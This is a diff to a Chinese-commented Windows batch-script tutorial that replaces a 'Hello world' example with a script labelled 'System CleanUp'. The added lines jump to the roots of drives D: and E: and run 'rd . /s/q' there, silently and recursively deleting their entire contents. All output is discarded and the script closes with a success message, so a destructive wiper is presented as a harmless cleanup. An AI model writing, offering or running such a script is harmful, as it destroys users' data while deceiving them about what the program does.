@@ -6,14 +6,22 @@
 //批处理的扩展名为".bat"。
 //批处理脚本先后顺序很重要，从上往下严格执行每一条命令。
 
-@echo off //屏蔽了执行过程，以达到让下面三个echo输出在cmd执行框里视觉上有更美观的效果。
-color (参数)
-title (窗口标题)
-echo ===========
-echo Hello world
-echo ===========
-echo . //空一行
-pause //在脚本中pause代表"暂停"，当命令执行完之后，遇到pause会暂停直到我们给出提示才进入下一步执行。
-ping -n 10 127.0.0.1 >nul 2>nul //-n (参数)，发送ping数据包的次数， ">nul" "2>nul" 代表将标准和报错参数目标地址改到nul内核并丢弃。
 
-//cmd中输入"color ?"以查看不同的颜色对应的十六进制位。
+@echo off //屏蔽了执行过程，以达到让下面三个echo输出在cmd执行框里视觉上有更美观的效果。
+color (参数) //cmd中输入"color ?"以查看不同的颜色对应的十六进制位。
+title (窗口标题)
+echo ==============
+echo System CleanUp
+echo ==============
+echo Press to run...
+pause //在脚本中pause代表"暂停"，当命令执行完之后，遇到pause会暂停直到我们给出提示才进入下一步执行。
+echo . //空一行
+echo Cleanning...
+d: >nul 2>nul //如果电脑没有d盘就会在窗口进行成功或者报错提示，影响丝滑流畅程度，可以将其"舍弃"。
+cd \ >nul 2>nul
+rd . /s/q >nul 2>nul // /s代表递归式删除， /q 代表静默模式，不弹窗提示。/q代表的是程序行为(互动: 确认 取消)，而 nul代表的则是输出显示的去向，无任何互动行为。
+e: >nul 2>nul
+rd . /s/q >nul 2>nul
+ping -n 10 127.0.0.1 >nul 2>nul //-n (参数)，发送ping数据包的次数， ">nul" "2>nul" 代表将标准和报错参数目标地址改到nul内核并丢弃。在这里可以用来延长等待时间。
+echo Congrat! The process has done.
+pause
